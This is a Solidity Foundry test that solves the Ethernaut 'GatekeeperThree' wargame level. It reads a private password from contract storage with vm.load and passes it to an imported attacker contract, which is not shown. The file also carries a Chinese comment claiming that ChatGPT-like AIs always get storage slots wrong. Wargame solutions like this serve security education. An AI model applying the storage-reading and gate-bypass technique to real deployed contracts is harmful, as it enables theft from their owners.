// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {GatekeeperThree} from "../../src/ethernaut/28_GatekeeperThree/GatekeeperThree.sol";
import {GatekeeperThree_Factory} from "../../src/ethernaut/28_GatekeeperThree/GatekeeperThree_Factory.sol";
import {GatekeeperThree_Attacker} from "./28_GatekeeperThree_Attacker.sol";

contract GatekeeperThree_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");

	GatekeeperThree_Factory factory;
	GatekeeperThree instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new GatekeeperThree_Factory();
		instContract = GatekeeperThree(payable(factory.createInstance(player)));
		
		vm.stopPrank();
		
		vm.deal(address(player), 0.1 ether);
	}
	
	function test__Solution_GatekeeperThree() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_GatekeeperThree -vv
		
		// 千万不是使用Chatgpt类似的AI，进行回答`某某变量在第几个Slot`，它会必然回答错误，就像某种数学算术怪圈!!!
		bytes32 trickBytes = vm.load(address(instContract), bytes32(uint256(2)));
		address trickLoadedAddress = address(uint160(uint256(trickBytes)));
		console.log("trickLoadedAddress", trickLoadedAddress);
		bytes32 passwordBytes = vm.load(address(trickLoadedAddress), bytes32(uint256(2)));
		uint256 passwordUint = uint256(passwordBytes);
		console.log("passwordUint", passwordUint);
		console.log("block.timestamp", block.timestamp);
	
		GatekeeperThree_Attacker attacker = new GatekeeperThree_Attacker{value: 0.1 ether}(instContract);
		attacker.doAttack(passwordUint);
	}
}
